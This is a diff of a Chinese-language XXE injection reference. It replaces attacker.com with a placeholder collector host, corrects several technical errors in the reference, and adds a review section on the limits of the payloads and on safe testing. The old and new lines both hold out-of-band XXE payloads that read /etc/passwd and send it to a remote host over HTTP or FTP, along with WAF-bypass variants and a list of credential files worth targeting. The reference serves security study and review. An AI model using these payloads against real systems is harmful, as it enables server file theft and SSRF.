@@ -78,7 +78,7 @@ _platform: windows_
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  <!ENTITY % xxe SYSTEM "https://collector.example.invalid/evil.dtd">
   %xxe;
 ]>
 <root>test</root>
@@ -99,7 +99,7 @@ _platform: windows_
 
 **概述：** XXE(XML External Entity)注入利用XML解析器处理外部实体引用的特性，通过定义恶意实体引用来读取服务器文件、发起SSRF请求、甚至在特定环境下执行远程代码。
 
-**漏洞原理：** XXE漏洞源于XML解析器默认启用外部实体处理。攻击者在XML输入中声明SYSTEM或PUBLIC实体指向本地文件(file://)或网络资源(http://)，解析器会自动获取并替换实体内容，导致文件读取和SSRF等危害。
+**漏洞原理：** XXE漏洞源于XML 解析器允许处理外部实体（默认行为因库、版本和配置而异）。攻击者在XML输入中声明SYSTEM或PUBLIC实体指向本地文件(file://)或网络资源(http://)，解析器会自动获取并替换实体内容，导致文件读取和SSRF等危害。
 
 **利用方法：** 完整利用流程：
 1. 找到XML输入点
@@ -130,7 +130,7 @@ _无回显的XXE攻击技术_
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
+<!ENTITY xxe SYSTEM "https://collector.example.invalid/xxe">
 ]>
 <foo>&xxe;</foo>
 ```
@@ -145,7 +145,7 @@ _无回显的XXE攻击技术_
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
+<!ENTITY % xxe SYSTEM "https://collector.example.invalid/xxe.dtd">
 %xxe;
 ]>
 <foo>test</foo>
@@ -159,14 +159,14 @@ _无回显的XXE攻击技术_
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
+<!ENTITY % xxe SYSTEM "https://collector.example.invalid/xxe.dtd">
 %xxe;
 ]>
 <foo>test</foo>
 
 # xxe.dtd内容
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://collector.example.invalid/?d=%file;'>">
 %eval;
 %exfil;
 ```
@@ -220,41 +220,41 @@ _利用OOB技术外带XXE数据_
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+<!ENTITY % xxe SYSTEM "https://collector.example.invalid/evil.dtd">
 %xxe;
 ]>
 <foo></foo>
 
 # evil.dtd
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://collector.example.invalid/log?data=%file;'>">
 %eval;
 %exfil;
 ```
 **语法解析：**
-- `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">` — 参数实体引用远程恶意DTD文件 _command_
+- `<!ENTITY % xxe SYSTEM "https://collector.example.invalid/evil.dtd">` — 参数实体引用远程恶意DTD文件 _command_
 - `%xxe;` — 在DTD中展开参数实体，加载远程DTD _operator_
 - `<!ENTITY % file SYSTEM "file:///etc/passwd">` — 在DTD中读取目标服务器本地文件 _value_
-- `http://attacker.com/log?data=%file;` — 通过HTTP请求参数将文件内容外带 _value_
+- `https://collector.example.invalid/log?data=%file;` — 通过HTTP请求参数将文件内容外带 _value_
 
 **2. FTP外带**
 > FTP外带数据
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+<!ENTITY % xxe SYSTEM "https://collector.example.invalid/evil.dtd">
 %xxe;
 ]>
 <foo></foo>
 
 # evil.dtd
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://collector.example.invalid/%file;'>">
 %eval;
 %exfil;
 ```
 **语法解析：**
-- `ftp://attacker.com/%file;` — 使用FTP协议外带数据，支持多行内容 _command_
+- `ftp://collector.example.invalid/%file;` — 使用FTP协议外带数据，支持多行内容 _command_
 - `%eval;` — 展开eval参数实体，动态构造外带实体 _operator_
 - `%exfil;` — 触发外带请求，将数据发送到攻击者FTP服务器 _operator_
 
@@ -263,15 +263,15 @@ _利用OOB技术外带XXE数据_
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-<!ENTITY xxe SYSTEM "http://attacker.com/log?file=/etc/passwd">
+<!ENTITY xxe SYSTEM "https://collector.example.invalid/log?file=/etc/passwd">
 ]>
 <foo>&xxe;</foo>
 
 # 或使用子域名
-<!ENTITY xxe SYSTEM "http://filecontent.attacker.com/">
+<!ENTITY xxe SYSTEM "http://synthetic-canary.collector.example.invalid/">
 ```
 **语法解析：**
-- `http://filecontent.attacker.com/` — 将文件内容作为子域名通过DNS解析外带 _value_
+- `http://synthetic-canary.collector.example.invalid/` — 固定 filecontent 字面量没有读取/编码文件，不证明数据外带 _value_
 - `&xxe;` — 在XML内容中引用通用实体触发请求 _operator_
 
 **WAF/EDR 绕过变体：**
@@ -287,7 +287,7 @@ _利用OOB技术外带XXE数据_
 ```
 **语法解析：**
 - `<![CDATA[` — XML CDATA段开始标记，内容不被XML解析器处理 _operator_
-- `&xxe;` — 实体引用在CDATA之前被解析展开 _variable_
+- `&xxe;` — CDATA 中实体引用是文字，不被展开；该例不会触发实体读取 _variable_
 - `]]>` — CDATA段结束标记 _operator_
 
 
@@ -562,7 +562,7 @@ file:///var/www/html/wp-` — XML内容 _value_
 
 **概述：** XXE文件读取是XXE漏洞最基础的利用方式，通过file://协议定义外部实体读取服务器本地文件。直接回显方式可在响应中看到文件内容，是XXE漏洞验证和信息收集的首要步骤。
 
-**漏洞原理：** XXE文件读取使用file://协议：<!ENTITY file SYSTEM "file:///etc/passwd">。可读取的关键文件包括系统配置(/etc/passwd,/etc/hosts)、应用源码、数据库配置(含密码)、SSH密钥等。二进制文件需使用PHP的php://filter/base64进行编码读取。
+**漏洞原理：** XXE文件读取使用file://协议：<!ENTITY file SYSTEM "file:///etc/passwd">。可读取的关键文件包括系统配置(/etc/passwd,/etc/hosts)、应用源码、数据库配置(含密码)、SSH密钥等。二进制文件需使用PHP的php://filter/convert.base64-encode/resource=PATH进行编码读取。
 
 **利用方法：** 完整利用流程：
 1. 发现XXE漏洞
@@ -589,28 +589,28 @@ _利用外部DTD文件进行XXE攻击_
 ```
 # 在攻击者服务器创建evil.dtd
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://collector.example.invalid/?d=%file;'>">
 %eval;
 %exfil;
 ```
 **语法解析：**
 - `<!ENTITY % file SYSTEM "file:///etc/passwd">` — 参数实体读取目标系统文件 _command_
 - `&#x25;` — %的HTML实体编码，在实体定义中引用其他参数实体 _operator_
-- `http://attacker.com/?d=%file;` — 通过HTTP请求参数外带文件内容 _value_
+- `https://collector.example.invalid/?d=%file;` — 通过HTTP请求参数外带文件内容 _value_
 
 **2. 引用外部DTD**
 > 引用外部DTD文件
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+<!ENTITY % xxe SYSTEM "https://collector.example.invalid/evil.dtd">
 %xxe;
 ]>
 <foo>test</foo>
 ```
 **语法解析：**
 - `<!DOCTYPE foo [` — DTD声明块开始 _command_
-- `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">` — 定义参数实体指向远程恶意DTD文件 _command_
+- `<!ENTITY % xxe SYSTEM "https://collector.example.invalid/evil.dtd">` — 定义参数实体指向远程恶意DTD文件 _command_
 - `%xxe;` — 展开参数实体，加载并执行远程DTD中的定义 _operator_
 
 **3. 多步骤外带**
@@ -802,7 +802,7 @@ word/_rels/document.xml.rels
 
 **概述：** DOCX文件与XLSX类似是基于XML的Office Open XML格式，通过修改其中的XML文件注入XXE实体，可在文档处理系统(在线预览/格式转换/内容提取)中触发服务端XXE漏洞。
 
-**漏洞原理：** DOCX XXE注入点包括：word/document.xml(主文档内容)、[Content_Types].xml(内容类型定义)、word/_rels/.rels(关系定义)等XML文件。在线文档预览服务、文件格式转换API、简历解析系统等都是高风险攻击面。
+**漏洞原理：** DOCX XXE注入点包括：word/document.xml(主文档内容)、[Content_Types].xml(内容类型定义)、word/_rels/document.xml.rels（文档关系）等XML文件。在线文档预览服务、文件格式转换API、简历解析系统等都是高风险攻击面。
 
 **利用方法：** 完整利用流程：
 1. 解压DOCX文件
@@ -813,3 +813,13 @@ word/_rels/document.xml.rels
 **防御措施：** 防御DOCX XXE：与XLSX防御相同，使用安全配置的XML解析器，禁用外部实体，对用户上传的Office文档进行预处理(剥离DTD/实体声明)，在隔离环境中处理不可信文档，限制文档处理进程的网络和文件访问权限。
 
 ---
+
+
+## 复核后的解析边界
+
+- `<![CDATA[&xxe;]]>` 保留字面 `&xxe;`，不展开实体。内部 DTD 中在实体声明内部引用参数实体受 XML 规范限制；外部 DTD 示例也需要相应加载/展开功能，不能把所有片段混为一个 XML 文档。
+- DOCTYPE 名称应匹配实际根元素以满足有效性约束；示意 Office XML 使用 `xmlns="..."` 不是有效 OOXML，不能替换整个实际部件。须保留原包关系/命名空间/结构并只在隔离夹具中修改；解压不可信归档还需阻止路径穿越和资源膨胀。
+- 只有声明 UTF-16 而不实际按该编码发送字节不会实现编码切换。CDATA 包装不自动触发 URL 外带；未引用的实体也不会必然请求。固定查询参数 `/etc/passwd` 或字面 filecontent 子域名不是读取目标文件的步骤。URL 特殊字符、多行和 DNS 标签大小/字符限制会破坏所列外带链，不能声称 FTP 无条件支持多行。
+- HTTP URL 指向 Redis 端口不会自动成为 Redis 协议。PHP filter/expect 依赖具体包装器、扩展和 XML 解析集成；expect 不是 PHP 默认功能，XML 中未转义 `<` 的 shell 片段本身也不满足良构性。XXE 不自动提供文件写入或主机代码执行。
+- Java 的 DISALLOW_DOCTYPE 不是通用 setFeature 常量；应按具体解析器官方文档配置完整功能 URI、拒绝外部 DTD/schema/实体并在不支持安全选项时失败关闭。剥离字符串声明或使用 JSON 不能替代底层解析器边界检查。
+- 证据优先使用批准的固定 canary 文件/端点，不提取真实凭据、不扫描内网。本次仅静态阅读，未加载 DTD、解析攻击 XML、解压文档或发出网络请求。
